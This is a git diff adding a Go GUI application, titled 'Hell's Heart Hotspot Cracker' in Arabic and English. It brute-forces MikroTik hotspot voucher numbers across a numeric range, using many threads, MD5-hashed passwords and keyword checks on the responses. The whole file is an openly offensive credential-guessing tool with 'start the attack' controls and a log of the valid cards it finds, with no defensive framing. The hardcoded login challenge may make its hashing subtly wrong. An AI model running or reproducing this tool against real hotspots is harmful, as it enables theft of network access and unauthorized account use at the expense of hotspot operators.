@@ -1,0 +1,426 @@
+package main
+
+import (
+	"crypto/md5"
+	"encoding/hex"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"net/url"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"fyne.io/fyne/v2"
+	"fyne.io/fyne/v2/app"
+	"fyne.io/fyne/v2/container"
+	"fyne.io/fyne/v2/data/binding"
+	"fyne.io/fyne/v2/dialog"
+	"fyne.io/fyne/v2/layout"
+	"fyne.io/fyne/v2/theme"
+	"fyne.io/fyne/v2/widget"
+)
+
+// ============================================================
+// المتغيرات العامة
+// ============================================================
+var (
+	totalAttempts int64
+	foundCards    []string
+	mutex         sync.Mutex
+	stopFlag      int32
+	running       int32
+)
+
+// ============================================================
+// دوال التشفير
+// ============================================================
+func mikrotikMD5(packetID, card, challenge string) string {
+	data := packetID + card + challenge
+	hash := md5.Sum([]byte(data))
+	return hex.EncodeToString(hash[:])
+}
+
+// ============================================================
+// تحليل الاستجابة
+// ============================================================
+func isSuccess(response string) bool {
+	response = strings.ToLower(response)
+	failKeywords := []string{
+		"invalid", "wrong", "incorrect", "failed", "error",
+		"خطأ", "فشل", "expired", "انتهى", "denied", "مستخدم",
+	}
+	for _, kw := range failKeywords {
+		if strings.Contains(response, kw) {
+			return false
+		}
+	}
+	successKeywords := []string{
+		"welcome", "success", "مرحباً", "تم", "logged in",
+		"logout", "connected", "redirect",
+	}
+	for _, kw := range successKeywords {
+		if strings.Contains(response, kw) {
+			return true
+		}
+	}
+	return false
+}
+
+// ============================================================
+// إرسال طلب
+// ============================================================
+func sendCard(targetURL, card string, timeout int) (string, error) {
+	challenge := "A1B2C3D4E5F6G7H8"
+	packetID := "00"
+	encryptedPass := mikrotikMD5(packetID, card, challenge)
+
+	formData := url.Values{}
+	formData.Set("username", card)
+	formData.Set("password", encryptedPass)
+	formData.Set("dst", "")
+
+	client := &http.Client{
+		Timeout: time.Duration(timeout) * time.Second,
+	}
+
+	req, err := http.NewRequest("POST", targetURL, strings.NewReader(formData.Encode()))
+	if err != nil {
+		return "", err
+	}
+
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	return string(body), nil
+}
+
+// ============================================================
+// التطبيق الرئيسي
+// ============================================================
+func main() {
+	myApp := app.New()
+	myApp.SetTheme(theme.DarkTheme())
+	myWindow := myApp.NewWindow("💀 القيادة قلب الجحيم")
+	myWindow.Resize(fyne.NewSize(480, 750))
+
+	// ===========================================
+	// حقول الإدخال
+	// ===========================================
+	urlEntry := widget.NewEntry()
+	urlEntry.SetText("http://192.168.1.1/hotspot/login")
+	urlEntry.SetPlaceHolder("http://192.168.1.1/hotspot/login")
+
+	startEntry := widget.NewEntry()
+	startEntry.SetText("200000000")
+
+	endEntry := widget.NewEntry()
+	endEntry.SetText("200010000")
+
+	threadsEntry := widget.NewEntry()
+	threadsEntry.SetText("20")
+
+	// ===========================================
+	// خيارات
+	// ===========================================
+	stopCheck := widget.NewCheck("التوقف عند أول نجاح", nil)
+	stopCheck.SetChecked(true)
+
+	shuffleCheck := widget.NewCheck("خلط الكروت", nil)
+	shuffleCheck.SetChecked(true)
+
+	// ===========================================
+	// شريط التقدم
+	// ===========================================
+	progress := widget.NewProgressBar()
+	progress.Min = 0
+	progress.Max = 100
+
+	// ===========================================
+	// إحصائيات
+	// ===========================================
+	statusLabel := widget.NewLabel("📡 في انتظار البدء...")
+	attemptsLabel := widget.NewLabel("المحاولات: 0")
+	speedLabel := widget.NewLabel("السرعة: 0/ث")
+	foundLabel := widget.NewLabel("✅ الكروت الصالحة: 0")
+	currentCard := widget.NewLabel("")
+	currentCard.Hide()
+
+	// ===========================================
+	// سجل الأحداث
+	// ===========================================
+	logData := binding.NewStringList()
+	logList := widget.NewListWithData(logData,
+		func() fyne.CanvasObject {
+			return widget.NewLabel("")
+		},
+		func(item binding.DataItem, obj fyne.CanvasObject) {
+			obj.(*widget.Label).Bind(item.(binding.String))
+			obj.(*widget.Label).Wrapping = fyne.TextWrapWord
+		},
+	)
+
+	addLog := func(msg string) {
+		timestamp := time.Now().Format("15:04:05")
+		logData.Append(fmt.Sprintf("[%s] %s", timestamp, msg))
+	}
+
+	// ===========================================
+	// النتيجة
+	// ===========================================
+	resultLabel := widget.NewLabel("")
+	resultLabel.Hide()
+	resultLabel.Alignment = fyne.TextAlignCenter
+	resultLabel.TextStyle = fyne.TextStyle{Bold: true, Monospace: true}
+
+	// ===========================================
+	// دالة الهجوم
+	// ===========================================
+	var attackFunc func()
+
+	startBtn := widget.NewButtonWithIcon("🔥 ابدأ الهجوم", theme.ConfirmIcon(), nil)
+	startBtn.Importance = widget.HighImportance
+
+	stopBtn := widget.NewButtonWithIcon("⏹ إيقاف", theme.CancelIcon(), func() {
+		atomic.StoreInt32(&stopFlag, 1)
+	})
+	stopBtn.Hide()
+
+	attackFunc = func() {
+		// أخذ القيم
+		targetURL := urlEntry.Text
+		startStr := startEntry.Text
+		endStr := endEntry.Text
+		threadsStr := threadsEntry.Text
+
+		if targetURL == "" || startStr == "" || endStr == "" {
+			dialog.ShowInformation("خطأ", "يرجى ملء جميع الحقول", myWindow)
+			return
+		}
+
+		start, err1 := strconv.ParseInt(startStr, 10, 64)
+		end, err2 := strconv.ParseInt(endStr, 10, 64)
+		threads, err3 := strconv.Atoi(threadsStr)
+
+		if err1 != nil || err2 != nil || err3 != nil || start >= end {
+			dialog.ShowInformation("خطأ", "القيم غير صالحة", myWindow)
+			return
+		}
+
+		stopOnFind := stopCheck.Checked
+		shuffle := shuffleCheck.Checked
+
+		// إعادة تعيين
+		atomic.StoreInt32(&stopFlag, 0)
+		atomic.StoreInt32(&running, 1)
+		atomic.StoreInt64(&totalAttempts, 0)
+		mutex.Lock()
+		foundCards = nil
+		mutex.Unlock()
+
+		// تحديث الواجهة
+		startBtn.Disable()
+		startBtn.SetText("⚔ جاري الهجوم...")
+		stopBtn.Show()
+		resultLabel.Hide()
+		progress.SetValue(0)
+		statusLabel.SetText("🔥 جاري الهجوم...")
+		statusLabel.Refresh()
+
+		_ = logData.Append("🔥🔥🔥 بدء الهجوم 🔥🔥🔥")
+		_ = logData.Append(fmt.Sprintf("📍 الرابط: %s", targetURL))
+		count := end - start + 1
+		_ = logData.Append(fmt.Sprintf("📋 الكروت: %s → %s (%d كرت)", startStr, endStr, count))
+
+		// توليد الكروت في خلفية
+		go func() {
+			generatedCards := make([]string, count)
+			for i := int64(0); i < count; i++ {
+				generatedCards[i] = strconv.FormatInt(start+i, 10)
+			}
+
+			if shuffle {
+				rand.Seed(time.Now().UnixNano())
+				rand.Shuffle(len(generatedCards), func(i, j int) {
+					generatedCards[i], generatedCards[j] = generatedCards[j], generatedCards[i]
+				})
+			}
+
+			startTime := time.Now()
+
+			// توزيع
+			cardChan := make(chan string, count)
+			var wg sync.WaitGroup
+
+			// تشغيل العمال
+			for i := 0; i < threads; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for card := range cardChan {
+						if atomic.LoadInt32(&stopFlag) == 1 {
+							return
+						}
+
+						response, err := sendCard(targetURL, card, 8)
+						if err != nil {
+							continue
+						}
+
+						atomic.AddInt64(&totalAttempts, 1)
+						current := atomic.LoadInt64(&totalAttempts)
+
+						// تحديث الواجهة كل 10 محاولات
+						if current%10 == 0 {
+							elapsed := time.Since(startTime).Seconds()
+							speed := float64(current) / elapsed
+							progressVal := float64(current) / float64(count)
+
+							app.NewDriver().RunOnMain(func() {
+								attemptsLabel.SetText(fmt.Sprintf("المحاولات: %d", current))
+								speedLabel.SetText(fmt.Sprintf("السرعة: %.0f/ث", speed))
+								progress.SetValue(progressVal)
+								currentCard.SetText(fmt.Sprintf("جاري تجربة: %s", card))
+								currentCard.Show()
+							})
+						}
+
+						if isSuccess(response) {
+							mutex.Lock()
+							foundCards = append(foundCards, card)
+							countFound := len(foundCards)
+							mutex.Unlock()
+
+							app.NewDriver().RunOnMain(func() {
+								foundLabel.SetText(fmt.Sprintf("✅ الكروت الصالحة: %d", countFound))
+								resultLabel.SetText(fmt.Sprintf("🎯🎯🎯\n%s\n🎯🎯🎯\nتم بعد %d محاولة", card, current))
+								resultLabel.Show()
+								statusLabel.SetText(fmt.Sprintf("✅ تم العثور على كرت: %s", card))
+							})
+
+							_ = logData.Append(fmt.Sprintf("🎯🎯🎯 كرت صالح: %s 🎯🎯🎯", card))
+
+							if stopOnFind {
+								atomic.StoreInt32(&stopFlag, 1)
+								return
+							}
+						}
+					}
+				}()
+			}
+
+			// إرسال الكروت
+			for _, card := range generatedCards {
+				if atomic.LoadInt32(&stopFlag) == 1 {
+					break
+				}
+				cardChan <- card
+			}
+			close(cardChan)
+			wg.Wait()
+
+			// إنهاء
+			atomic.StoreInt32(&running, 0)
+			elapsed := time.Since(startTime)
+			mutex.Lock()
+			found := len(foundCards)
+			mutex.Unlock()
+			total := atomic.LoadInt64(&totalAttempts)
+
+			app.NewDriver().RunOnMain(func() {
+				startBtn.Enable()
+				startBtn.SetText("🔥 ابدأ الهجوم 🔥")
+				stopBtn.Hide()
+				progress.SetValue(1.0)
+
+				if found > 0 {
+					statusLabel.SetText(fmt.Sprintf("✅ تم العثور على %d كرت صالح!", found))
+				} else {
+					statusLabel.SetText("⚠️ لم يتم العثور على كروت صالحة")
+				}
+
+				elapsedStr := fmt.Sprintf("انتهى بعد %.0f ثانية - %d محاولة", elapsed.Seconds(), total)
+				_ = logData.Append(fmt.Sprintf("🏁 %s", elapsedStr))
+			})
+		}()
+	}
+
+	startBtn.OnTapped = attackFunc
+
+	// ===========================================
+	// تخطيط الواجهة
+	// ===========================================
+	form := container.NewVBox(
+		// العنوان
+		widget.NewLabelWithStyle("💀 القيادة قلب الجحيم 💀", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+		widget.NewLabelWithStyle("⚔ Hell's Heart Hotspot Cracker ⚔", fyne.TextAlignCenter, fyne.TextStyle{}),
+
+		widget.NewSeparator(),
+
+		// الرابط
+		widget.NewLabel("🔗 رابط صفحة الدخول:"),
+		urlEntry,
+
+		// النطاق
+		widget.NewLabel("🔢 نطاق الكروت (9 أرقام تبدأ بـ 2):"),
+		container.NewBorder(nil, nil,
+			widget.NewLabel("من:"),
+			widget.NewLabel("إلى:"),
+			container.NewHBox(startEntry, endEntry),
+		),
+
+		// عدد الخيوط
+		widget.NewLabel("⚡ عدد الخيوط:"),
+		threadsEntry,
+
+		// خيارات
+		stopCheck,
+		shuffleCheck,
+
+		widget.NewSeparator(),
+
+		// أزرار
+		startBtn,
+		stopBtn,
+
+		widget.NewSeparator(),
+
+		// شريط التقدم
+		progress,
+		currentCard,
+
+		// إحصائيات
+		container.NewGridWithColumns(3,
+			attemptsLabel,
+			speedLabel,
+			foundLabel,
+		),
+		resultLabel,
+		statusLabel,
+	)
+
+	content := container.NewBorder(form, nil, nil, nil,
+		container.NewBorder(
+			widget.NewLabelWithStyle("📋 سجل الهجوم:", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
+			nil, nil, nil,
+			logList,
+		),
+	)
+
+	myWindow.SetContent(content)
+	myWindow.ShowAndRun()
+}
